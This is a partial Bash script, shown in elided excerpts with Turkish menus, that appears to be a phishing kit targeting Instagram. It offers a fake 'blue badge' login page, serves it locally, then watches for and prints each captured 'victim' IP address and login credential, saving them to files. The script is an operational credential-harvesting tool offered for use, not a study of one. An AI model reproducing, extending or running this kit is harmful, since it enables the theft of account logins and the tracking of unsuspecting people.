...
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77mST\e[0m\e[1;31m]\e[0m\e[1;93m Termux Kurulum \e[1;31m[\e[0m\e[1;77mSL\e[0m\e[1;31m]\e[0m\e[1;93m Linux Kurulum \e[0m\e[1;31m[\e[0m\e[1;77mEX\e[0m\e[1;31m]\e[0m\e[1;93m Exit\e[0m\n"
printf "\e[0m\n"
...
clear
printf "\n\e[1;92mTermux Kurulumunu Çalıştır"
sleep 0.5
printf "."
sleep 0.5
printf "."
...
clear
printf "\n\e[1;92mLinux Kurulumunu Çalıştır "
sleep 0.5
printf "."
sleep 0.5
printf "."
...
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Mavi Rozet Giriş Sayfası\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Bir seçenek seçin: \e[0m\e[1;96m\en' option
if [[ $option == 1 || $option == 01 ]]; then
server="instagram"
...
printf "\e[0m\n"
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Oturum Açma Bilgileri ...\e[0m\n"
while [ true ]; do
if [[ -e "sites/$server/ip.txt" ]]; then
c_ip
rm -rf sites/$server/ip.txt
...
sleep 2
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Başarılı Barındırıldığı Yer:\e[0m\e[1;93m http://localhost:$port\e[0m\n"
printf "\n"
found
}
found() {
...
if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Kurban IP'si Bulundu!\n"
printf "\n"
c_ip
rm -rf sites/$server/ip.txt
fi
sleep 0.75
if [[ -e "sites/$server/usernames.txt" ]]; then
printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Oturum açma bilgisi Bulundu!\n"
printf "\n"
c_cred
rm -rf sites/$server/usernames.txt
fi
...
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Kurban IP'si Bulundu!\e[0m\e[1;96m %s\e[0m\n" $ip
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Kaydedildi:\e[0m\e[1;93m sites/%s/victim_ip.txt\e[0m\n" $server
printf "\n"
